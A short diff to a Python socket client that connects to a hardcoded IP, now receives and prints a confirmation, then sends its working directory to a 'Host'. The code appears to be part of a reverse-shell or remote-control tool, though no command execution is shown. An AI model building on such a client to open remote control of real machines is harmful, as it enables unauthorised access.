@@ -18,6 +18,9 @@ SEPARATOR = "<sep>"
 # connect to the server
 s.connect(('10.67.98.152', Port)) #Your IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact
 
+confirm = s.recv(Size).decode()
+print(confirm)
+
 cwd = os.getcwd() #Sets cwd to os.getcwd()
 s.send(cwd.encode()) #Sends the cwd to the Host
 
